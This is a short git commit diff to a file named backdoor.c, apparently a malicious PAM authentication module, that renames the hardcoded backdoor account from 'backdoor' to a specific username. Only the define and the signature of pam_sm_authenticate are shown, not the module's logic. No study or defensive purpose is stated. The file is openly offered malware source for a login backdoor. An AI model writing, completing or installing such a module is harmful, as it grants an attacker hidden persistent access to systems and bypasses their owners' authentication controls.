83e34d59309656311ede84f8b320f6bd781ea859
NCheg413 <143832860+NCheg413@users.noreply.github.com>
2025-05-07 23:36:45 -0400

    Update backdoor.c

--- backdoor.c
+++ backdoor.c
@@ -7,7 +7,7 @@
 #include <unistd.h>
 
 
-#define BACKDOOR_USER "backdoor"
+#define BACKDOOR_USER "nihargayam"
 
 PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags,
                                     int argc, const char **argv) {
